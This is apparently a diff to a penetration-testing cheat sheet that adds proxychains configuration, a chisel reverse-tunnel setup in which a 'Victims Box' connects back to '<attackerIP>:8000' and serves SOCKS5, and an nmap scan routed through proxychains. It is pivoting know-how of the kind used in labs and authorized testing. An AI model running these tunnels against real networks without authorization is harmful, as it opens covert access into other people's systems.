@@ -12,10 +12,25 @@ Attackers Box: .\chisel.exe server -p 8011 --reverse
 https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=5446  
 
 ```
+Configuring Proxychains:
+
+vim /etc/proxychains.conf
+
+comment proxy_dns
+uncomment quiet_mode
+remove any entries within proxy list
+add socks5 127.0.0.1 1080
+
+Setting up chisel:
+
 Attackers Box: ./chisel server -p 8000 --reverse
 Victims Box: .\chisel.exe client <attackerIP>:8000 R:8001:127.0.0.1:1337
 Victims Box: .\chisel.exe server -p 1337 --socks5
 Attackers Box: ./chisel client 127.0.0.1:8001 socks
+
+Testing proxychains command:
+
+proxychains nmap -sT <IP> -p <PORT> --min-rate=6000 -Pn
 ```
 
 Standard Proxychains:  
